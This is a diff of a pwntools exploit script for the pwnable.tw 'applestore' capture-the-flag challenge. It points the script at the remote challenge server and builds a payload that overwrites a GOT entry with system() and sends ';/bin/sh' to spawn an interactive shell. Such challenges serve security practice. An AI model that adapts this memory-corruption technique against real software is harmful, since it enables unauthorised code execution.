@@ -35,10 +35,10 @@ def trigger(cont):
 
 
 
-DEBUG = True
+DEBUG = False
 
-# p = remote('chall.pwnable.tw', 10104)
-# elf = ELF('./libc_32.so.6')
+p = remote('chall.pwnable.tw', 10104)
+elf = ELF('./libc_32.so.6')
 
 if DEBUG:  
   p = process('/home/len/pwnable/applestore')
@@ -111,14 +111,15 @@ if __name__ == "__main__":
   # payload = '7\x0a' + p32(0) * 4
   # p.sendlineafter('> ', payload)
 
-  payload = '27' + p32(0) + p32(0) + p32(atoi_got-0x22) + p32(ebp_addr-8) 
+  payload = '27' + p32(0) + p32(0) + p32(atoi_got+0x22) + p32(ebp_addr-8) 
   delete(payload)
 
   pdb.set_trace()
   
   # p.sendlineafter('> ', p32(system_addr) + ';/bin/sh\x00')
   payload = p32(system_addr) + ';/bin/sh\x00'
-  cart(payload)
+  p.sendlineafter('> ', p32(system_addr) + ';/bin/sh\x00')
+  # cart(payload)
   p.interactive()
 
 
